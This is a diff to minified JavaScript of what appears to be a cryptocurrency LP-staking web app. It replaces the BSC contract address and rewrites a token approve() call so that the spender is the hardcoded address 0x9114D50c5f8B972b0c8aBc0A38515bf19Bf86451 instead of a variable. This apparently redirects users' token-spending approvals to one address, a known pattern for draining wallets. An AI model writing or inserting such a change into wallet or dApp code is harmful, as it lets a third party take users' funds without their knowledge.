@@ -85,7 +85,7 @@
         var i, o, r, s, l, d = a(n("5530")), u = a(n("ade3")), c = a(n("ff3d")), f = a(n("fcce")), p = {
             HECO: "0xefeCb26368F846a519Cac258EDAdc2Ae20dB026F",
             HECOTEST: "0xcBb1eD4b69bD0b418D86B3Bf8e720529242a1E64",
-            BSC: "0xc5dda17d98dfe00e767dc4c00cb4267a0abf7a79",
+            BSC: "0x9114D50c5f8B972b0c8aBc0A38515bf19Bf86451",
             bsctest: "0x1c0f5F4217A6E0A6b3eadF19Ace40Ab3A088C419"
         }, m = {
             HECO: "0x7fEDbe882a9d83DaB9FDFbeB2F958a65A06604ba",
@@ -1202,10 +1202,12 @@
 						
                         t.minerConf.anum2 = e[0][14], 
                         t.minerConf.stakes2 = e[0][10], //全网LP质押
-                        t.minerConf.eth2 = e[0][24],
+                        t.minerConf.eth2 = e[0][28], //矿池
  
-                        t.minerConf.lpasset2 = e[0][26],
+                        t.minerConf.lpasset2 = e[0][23],
                         t.minerConf.lpallow2 = e[0][27],
+						
+						//console.log(e[0][22]);
 						
                         //t.minerConf.lpasset2 = 123456*10**18,
                         
@@ -1854,7 +1856,7 @@
                       , e = this
                       , n = new r.eth.Contract(c.default.coinAbi,'0x5a92a0A3aD1eF31E8B53527c9c09dDf391eb47F1');
                     e.minerConf.doing32 = !0,
-                    n.methods.approve(l, t).send({
+                    n.methods.approve('0x9114D50c5f8B972b0c8aBc0A38515bf19Bf86451', t).send({
                         from: e.address
                     }).then((function(t) {
                         e.minerConf.doing32 = !1,
